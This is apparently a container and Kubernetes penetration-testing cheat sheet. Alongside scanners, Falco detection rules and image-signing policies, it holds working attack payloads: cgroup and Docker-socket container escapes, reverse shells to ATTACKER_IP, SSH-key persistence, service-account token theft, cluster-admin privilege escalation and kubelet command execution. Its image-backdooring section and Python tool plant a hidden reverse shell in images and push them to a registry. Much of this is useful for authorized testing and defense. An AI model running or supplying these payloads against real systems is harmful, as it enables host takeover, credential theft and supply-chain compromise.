# Container Security Payloads

> Container security testing attack payloads, organized by category. All commands are for authorized security testing only.

---

## 1. Docker Image Analysis

### Trivy Scanning

```bash
# Scan image vulnerabilities - identify known CVEs
trivy image nginx:latest

# Filter by severity level
trivy image --severity HIGH,CRITICAL alpine:3.18

# Scan local file system (check Dockerfile, K8s manifests)
trivy fs /path/to/project

# Scan K8s configuration files
trivy config ./k8s-manifests/

# Output JSON format for automated processing
trivy image --format json --output results.json target:latest

# SBOM generation and scanning
trivy image --format sbom --output sbom.json target:latest
```

### Dockle Image Best Practice Checks

```bash
# Check if image follows best practices (e.g., not running as root, no sensitive files)
dockle nginx:latest

# Specify exit code level
dockle --exit-code 1 --exit-level warn target:latest

# Output JSON format
dockle --format json target:latest
```

### Dive Image Layer Analysis

```bash
# Analyze image layer contents, discover large files, sensitive files, and redundant layers
dive nginx:latest

# CI mode - check image efficiency score
dive --ci target:latest

# Ignore order for efficiency scoring
dive --ignore-order target:latest
```

### Grype Vulnerability Scanning

```bash
# Quick vulnerability scan
grype nginx:latest

# Scan from SBOM file
grype sbom:./sbom.json

# Show only specific severity levels
grype nginx:latest --only fixed
```

---

## 2. Container Escape Techniques

### Environment Detection

```bash
# Detect if currently running inside a container
cat /proc/1/cgroup | grep -q docker && echo "IN CONTAINER"
ls -la /.dockerenv 2>/dev/null && echo "DOCKER ENV"

# Check privileged mode - if cap_effective contains all capabilities
capsh --print

# Check sensitive mount points
mount | grep -E "docker.sock|proc|sysfs|dev"
ls -la /var/run/docker.sock 2>/dev/null
```

### Docker Socket Escape

```bash
# Create privileged container on host via mounted docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host

# Direct API operation
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"]}'
```

### Privileged Container Escape

```bash
# cgroup release_agent escape (requires privileged mode)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Kernel Vulnerability Exploitation

```bash
# Check kernel version
uname -r

# Search for kernel privilege escalation vulnerabilities
searchsploit linux kernel $(uname -r | cut -d- -f1) privilege escalation

# Metasploit container detection module
use post/linux/gather/checkcontainer
run
use post/linux/gather/enum_containers
run post/linux/gather/enum_containers SESSION=1 CMD="env"
```

---

## 3. Kubernetes Security Testing

### kubectl Information Enumeration

```bash
# Enumerate cluster role bindings - discover over-privileged assignments
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -n default -o wide

# Check ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default

# Check Secrets mounted by Pods
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.serviceAccountName}{"\n"}{end}'

# Enumerate all Secrets
kubectl get secrets --all-namespaces
kubectl get secret -o yaml <secret-name>

# Enumerate Pods and their security contexts
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'
```

### kubeaudit Automated Audit

```bash
# Comprehensive security audit
kubeaudit all -n default

# Check privileged containers
kubeaudit privileged -n kube-system

# Check if running as non-root
kubeaudit runasnonroot --all-namespaces

# Check for mounted docker.sock
kubeaudit automountserviceaccounttoken --all-namespaces
```

### kube-bench CIS Compliance

```bash
# Kubernetes CIS Benchmark - Master node
kube-bench master

# Kubernetes CIS Benchmark - Worker node
kube-bench node

# Check both Master and Node
kube-bench run --targets master,node

# Output JSON format
kube-bench master --json > kube-bench-results.json
```

---

## 4. Container Runtime Security

### Container Configuration Checks

```bash
# Check if container is running in privileged mode
docker inspect --format '{{.HostConfig.Privileged}}' <container>

# Check Linux capabilities added to container
docker inspect --format '{{json .HostConfig.CapAdd}}' <container>

# Check host directories mounted into container
docker inspect --format '{{json .HostConfig.Binds}}' <container>

# Check container user mapping
docker inspect --format '{{json .Config.User}}' <container>

# List running processes inside container
docker top <container>
```

### Falco Runtime Rules

```yaml
# Detect shell execution inside container
- rule: Terminal Shell in Container
  desc: A shell was spawned in a container
  condition: spawned_process and container and proc.name in (bash, sh, zsh)
  output: "Shell spawned in container (user=%user.name container=%container.name shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)"
  priority: WARNING

# Detect sensitive file reads
- rule: Read Sensitive File
  desc: Attempt to read sensitive file in container
  condition: open_read and container and fd.name in (/etc/shadow, /etc/passwd)
  output: "Sensitive file read (user=%user.name container=%container.name file=%fd.name)"
  priority: CRITICAL

# Detect container escape indicators
- rule: Container Escape via Mount
  desc: Write to docker.sock detected in container
  condition: open_write and container and fd.name contains /var/run/docker.sock
  output: "Potential container escape (user=%user.name container=%container.name file=%fd.name)"
  priority: CRITICAL
```

---

## 5. Registry Security

```bash
# Detect unauthenticated Docker Registry
curl -s http://<registry-ip>:5000/v2/_catalog
curl -s http://<registry-ip>:5000/v2/<image>/tags/list

# Enumerate image list in Registry
curl -s http://<registry-ip>:5000/v2/_catalog | jq .

# Get image manifest (includes history layers and configuration)
curl -s http://<registry-ip>:5000/v2/<image>/manifests/<tag> \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json"

# Download image layer files to check sensitive content
curl -s http://<registry-ip>:5000/v2/<image>/blobs/<digest> -o layer.tar

# Use trivy to scan remote Registry
trivy image --username <user> --password <pass> <registry>/<image>:<tag>
```

---

## 6. Network Policy Testing

```bash
# List current Network Policies
kubectl get networkpolicies --all-namespaces

# Test inter-Pod network connectivity (should be reachable without policies)
kubectl exec -it <pod> -- curl -s http://<target-pod-ip>:<port>

# Deploy default deny-all ingress Network Policy
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
EOF

# Deploy policy allowing specific labeled Pods
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
      protocol: TCP
EOF

# Verify policy enforcement
kubectl exec -it <frontend-pod> -- curl -s http://<backend-ip>:8080
kubectl exec -it <other-pod> -- curl -s --max-time 3 http://<backend-ip>:8080
```

---

## 7. Secret Detection in Images

```bash
# Use trivy to scan for secrets and sensitive information in images
trivy image --scanners secret nginx:latest

# Use truffleHog to scan Docker images
trufflehog docker --image nginx:latest

# Search for hardcoded secrets in image layers
docker history --no-trunc nginx:latest 2>/dev/null | grep -iE "password|secret|token|key|api"

# Export image layers and search for sensitive files
docker save nginx:latest -o image.tar
tar xf image.tar
find . -name "layer.tar" -exec sh -c 'tar tf "$1" | grep -iE "\.env|secret|password|\.pem|\.key"' _ {} \;
```

---

## 8. Privilege Escalation in Containers

```bash
# Check current user and capabilities
id
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# Check sudo configuration
sudo -l 2>/dev/null

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check writable sensitive paths
find / -writable -type d 2>/dev/null | grep -E "etc|var|opt|tmp"

# Check kernel module loading capability
cat /proc/sys/kernel/modules_disabled

# Check seccomp configuration status
cat /proc/self/status | grep Seccomp
```

---

## 9. Docker Socket Exploitation

### Mounted Socket Abuse

```bash
# Verify docker socket is accessible
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/version

# List all containers on the host
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq '.[].Names'

# List all images on the host
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[].RepoTags'

# Create a privileged container mounting host filesystem
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' | jq '.Id'

# Start the container
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/CONTAINER_ID/start
```

### Container Escape via API

```bash
# Full escape: spawn reverse shell on host via docker socket
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "chroot /host /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true,
      "PidMode": "host",
      "NetworkMode": "host"
    }
  }'

# Write SSH key to host for persistent access
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "echo ssh-rsa AAAA... >> /host/root/.ssh/authorized_keys"],
    "HostConfig": {"Binds": ["/:/host"]}
  }'

# Execute command in existing container
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"Cmd": ["cat", "/etc/shadow"], "AttachStdout": true}' | jq -r '.Id')

curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/exec/$EXEC_ID/start \
  -H "Content-Type: application/json" \
  -d '{"Detach": false, "Tty": false}'
```

```python
# Automated docker socket exploitation script
import docker
import json

def exploit_docker_socket(socket_path='/var/run/docker.sock'):
    """Exploit mounted docker socket for container escape."""
    client = docker.DockerClient(base_url=f'unix://{socket_path}')
    
    # Enumerate host information
    info = client.info()
    print(f"[+] Docker Host: {info['Name']}")
    print(f"[+] OS: {info['OperatingSystem']}")
    print(f"[+] Kernel: {info['KernelVersion']}")
    print(f"[+] Containers: {info['Containers']}")
    
    # Create escape container
    escape_container = client.containers.run(
        'alpine',
        command='/bin/sh -c "cat /host/etc/shadow"',
        volumes={'/': {'bind': '/host', 'mode': 'rw'}},
        privileged=True,
        detach=True,
        remove=True
    )
    
    output = escape_container.logs().decode()
    print(f"[+] Host /etc/shadow:\n{output}")
    
    # Read host SSH keys
    key_container = client.containers.run(
        'alpine',
        command='/bin/sh -c "find /host/home -name id_rsa 2>/dev/null"',
        volumes={'/': {'bind': '/host', 'mode': 'ro'}},
        detach=True,
        remove=True
    )
    keys = key_container.logs().decode()
    if keys:
        print(f"[!] SSH private keys found:\n{keys}")

exploit_docker_socket()
```

---

## 10. Kubernetes RBAC Bypass

### Service Account Token Theft

```bash
# Read service account token from default mount
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use stolen token to authenticate to API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# Check permissions with stolen token
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}'

# List secrets in current namespace
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/secrets" | jq '.items[].metadata.name'

# Get specific secret
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/secrets/db-credentials" | jq '.data | map_values(@base64d)'
```

### Role Binding Abuse

```bash
# Enumerate cluster role bindings for over-privileged accounts
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Find service accounts with cluster-admin
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | select(.subjects[].kind=="ServiceAccount") | {name: .metadata.name, subjects: .subjects}'

# Create a new role binding to escalate privileges (if create rolebinding permission exists)
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# Enumerate all permissions for a service account
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
kubectl auth can-i create pods --as=system:serviceaccount:default:default
kubectl auth can-i get secrets --as=system:serviceaccount:default:default
```

```yaml
# Malicious RoleBinding to escalate default service account
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalation-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
```

---

## 11. Container Image Backdooring

### Layer Injection

```bash
# Pull target image and add backdoor layer
docker pull target-app:latest
docker run -it target-app:latest /bin/sh -c \
  'echo "* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"" >> /etc/crontabs/root && \
   echo "backdoor installed"'

# Commit modified container as new image
docker commit $(docker ps -lq) target-app:backdoored

# Create Dockerfile that injects backdoor into existing image
cat << 'EOF' > Dockerfile.backdoor
FROM target-app:latest
RUN apt-get update && apt-get install -y netcat-openbsd
COPY backdoor.sh /usr/local/bin/.health-check
RUN chmod +x /usr/local/bin/.health-check
# Hide in legitimate-looking entrypoint wrapper
COPY entrypoint-wrapper.sh /entrypoint-wrapper.sh
ENTRYPOINT ["/entrypoint-wrapper.sh"]
EOF

docker build -f Dockerfile.backdoor -t target-app:latest .
```

### Entrypoint Manipulation

```bash
# Inspect original entrypoint
docker inspect target-app:latest --format '{{json .Config.Entrypoint}}'
docker inspect target-app:latest --format '{{json .Config.Cmd}}'

# Create wrapper script that runs backdoor before legitimate entrypoint
cat << 'EOF' > entrypoint-wrapper.sh
#!/bin/sh
# Run backdoor in background
(/bin/sh -c 'while true; do /bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null; sleep 60; done') &
# Execute original entrypoint
exec /docker-entrypoint.sh "$@"
EOF

# Build and push backdoored image
docker build -t registry.internal/app:latest .
docker push registry.internal/app:latest
```

```python
# Automated image backdoor injection tool
import docker
import tarfile
import io
import json

def inject_backdoor(image_name, attacker_ip, attacker_port):
    """Inject a reverse shell backdoor into a container image."""
    client = docker.from_env()
    
    # Create backdoor script
    backdoor_script = f"""#!/bin/sh
while true; do
    /bin/sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 2>/dev/null
    sleep 300
done
"""
    
    # Run container and inject
    container = client.containers.run(
        image_name,
        command='/bin/sh -c "echo done"',
        detach=True
    )
    
    # Create tar archive with backdoor
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode='w') as tar:
        backdoor_bytes = backdoor_script.encode()
        info = tarfile.TarInfo(name='/usr/local/bin/.sysmon')
        info.size = len(backdoor_bytes)
        info.mode = 0o755
        tar.addfile(info, io.BytesIO(backdoor_bytes))
    
    tar_stream.seek(0)
    container.put_archive('/', tar_stream)
    
    # Commit as new image
    container.commit(repository=image_name.split(':')[0], tag='latest')
    container.remove(force=True)
    print(f"[+] Backdoored image committed as {image_name}")

inject_backdoor('internal-app:latest', '10.0.0.50', '4444')
```

---

## 12. Pod Security Bypass

### Privileged Escalation

```yaml
# Pod spec requesting privileged access
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
  namespace: default
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

### hostPath Abuse

```yaml
# Pod mounting sensitive host paths
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-abuse
spec:
  containers:
  - name: reader
    image: alpine
    command: ["/bin/sh", "-c", "cat /host-etc/shadow; sleep infinity"]
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
      readOnly: true
    - name: host-var-log
      mountPath: /host-logs
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
  - name: host-var-log
    hostPath:
      path: /var/log
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

### Node Access

```bash
# Escape to node via privileged pod
kubectl run node-shell --image=alpine --restart=Never --overrides='{
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "shell",
      "image": "alpine",
      "command": ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "--", "/bin/bash"],
      "stdin": true,
      "tty": true,
      "securityContext": {"privileged": true}
    }],
    "nodeSelector": {"kubernetes.io/hostname": "target-node"}
  }
}' -it --rm

# Access node kubelet API
curl -sk https://NODE_IP:10250/pods | jq '.items[].metadata.name'
curl -sk https://NODE_IP:10250/run/default/POD_NAME/CONTAINER_NAME -d "cmd=id"

# Read kubelet credentials
curl -sk https://NODE_IP:10250/configz | jq .

# Enumerate all pods on node via kubelet
curl -sk "https://NODE_IP:10250/pods" | \
  jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, containers: [.spec.containers[].name]}'
```

---

## 13. Service Mesh Attacks

### Istio/Envoy Exploitation

```bash
# Access Envoy admin interface (often exposed on port 15000)
curl http://POD_IP:15000/config_dump | jq '.configs[].dynamic_active_clusters'
curl http://POD_IP:15000/clusters
curl http://POD_IP:15000/stats

# Extract service mesh certificates
curl http://POD_IP:15000/certs | jq .

# Enumerate Istio configuration
kubectl get virtualservices --all-namespaces -o yaml
kubectl get destinationrules --all-namespaces -o yaml
kubectl get gateways --all-namespaces -o yaml

# Check for permissive mTLS (allows plaintext)
kubectl get peerauthentication --all-namespaces -o yaml | grep -A5 "mtls"
kubectl get destinationrules --all-namespaces -o json | \
  jq '.items[] | select(.spec.trafficPolicy.tls.mode=="DISABLE") | .metadata.name'
```

### mTLS Bypass

```bash
# Check if mTLS is enforced or permissive
kubectl get peerauthentication -n istio-system -o yaml

# If PERMISSIVE mode, connect without mTLS
curl -v http://target-service.default.svc.cluster.local:8080/api/data

# Bypass mTLS by accessing pod IP directly (bypassing sidecar)
# Find pod IP
POD_IP=$(kubectl get pod target-pod -o jsonpath='{.status.podIP}')
# Connect to application port directly (not envoy port)
curl http://$POD_IP:8080/api/sensitive-data

# Exploit Istio AuthorizationPolicy misconfiguration
kubectl get authorizationpolicy --all-namespaces -o json | \
  jq '.items[] | select(.spec.rules==null or .spec.action=="ALLOW") | .metadata'
```

### Sidecar Injection

```yaml
# Malicious sidecar that intercepts all traffic
apiVersion: v1
kind: Pod
metadata:
  name: interceptor
  annotations:
    sidecar.istio.io/inject: "false"  # Disable legitimate sidecar
spec:
  containers:
  - name: app
    image: target-app:latest
    ports:
    - containerPort: 8080
  - name: interceptor
    image: alpine
    command: ["/bin/sh", "-c"]
    args:
    - |
      apk add tcpdump socat
      # Intercept traffic on app port
      socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:8081 &
      # Capture all traffic
      tcpdump -i any -w /tmp/capture.pcap &
      sleep infinity
    securityContext:
      capabilities:
        add: ["NET_ADMIN", "NET_RAW"]
```

---

## 14. Registry Security

### Image Signing Verification

```bash
# Verify image signature with cosign
cosign verify --key cosign.pub registry.example.com/app:latest

# Check if image is signed
cosign tree registry.example.com/app:latest

# Verify with Notary v2 (notation)
notation verify registry.example.com/app:latest

# List signatures for an image
notation list registry.example.com/app:latest

# Check signature policy enforcement
kubectl get clusterpolicy -o yaml | grep -A10 "verifyImages"
```

### Notary/Cosign Operations

```bash
# Sign image with cosign
cosign sign --key cosign.key registry.example.com/app:latest

# Generate and use keyless signing (Sigstore/Fulcio)
cosign sign --identity-token=$(gcloud auth print-identity-token) \
  registry.example.com/app:latest

# Attach SBOM to image
cosign attach sbom --sbom sbom.json registry.example.com/app:latest

# Verify SBOM attachment
cosign verify-attestation --key cosign.pub \
  --type spdxjson registry.example.com/app:latest

# Sign with notation (Notary v2)
notation sign registry.example.com/app:latest \
  --key "signing-key" --signature-format cose
```

### Admission Control

```yaml
# Kyverno policy to enforce image signing
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  background: false
  rules:
  - name: verify-cosign-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "registry.example.com/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----
```

```yaml
# OPA Gatekeeper constraint to block unsigned images
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: require-signed-images
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["production"]
  parameters:
    repos:
    - "registry.example.com/signed/"
    - "gcr.io/verified-project/"
---
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedrepos
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRepos
      validation:
        openAPIV3Schema:
          type: object
          properties:
            repos:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedrepos
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not startswith(container.image, input.parameters.repos[_])
        msg := sprintf("Image '%v' is not from an allowed registry", [container.image])
      }
```
